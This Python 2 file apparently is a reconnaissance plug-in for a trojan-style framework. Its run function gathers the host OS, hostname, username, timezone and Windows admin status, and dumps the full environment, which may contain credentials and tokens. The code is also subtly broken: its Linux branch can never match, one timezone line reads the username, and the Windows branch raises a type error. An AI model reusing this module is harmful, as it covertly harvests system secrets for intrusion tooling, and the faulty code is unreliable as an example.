import os
import platform
import time
import socket
import ctypes

def run(**args):
    print "[*] In basic info gather module."
    info = ""    
    if platform.system() == "linux" or platform.system() == "linux2":
        print ("Its linux") #LINUX
        info = "OS Type: Linux \n"
        info += "Hostname: " + str(socket.gethostname()) +"\n"
        info += "Username: " + str(os.getenv('USER')) +"\n"
        info += "Timezone: " + str(time.tzname) +"\n"
        info += "Timezone: " + str(os.getenv('USER')) +"\n"
        info += "Environment" + str(os.environ)
    elif platform.system() == "darwin" or platform.system() == "Darwin":
        print ("It's OSX") #OSX
        info = "OS Type: OSX \n"
        info += "Hostname: " + str(socket.gethostname()) +"\n"
        info += "Username: " + str(os.getenv('USER')) +"\n"
        info += "Timezone: " + str(time.tzname) +"\n"
        info += "Environment" + str(os.environ)
    elif platform.system() == "win32" or platform.system() == "Windows":
        print ("It's Windows") # Windows
        info = "OS Type: Windows \n"
        info += "Am I Admin: " + ctypes.windll.shell32.IsUserAnAdmin()
        info += "Hostname: " + str(socket.gethostname()) +"\n"
        info += "Timezone: " + str(time.tzname) +"\n"
        info += "Username: " + str(os.getenv('USERNAME')) +"\n"
        info += "Environment" + str(os.environ)
    return str(info)



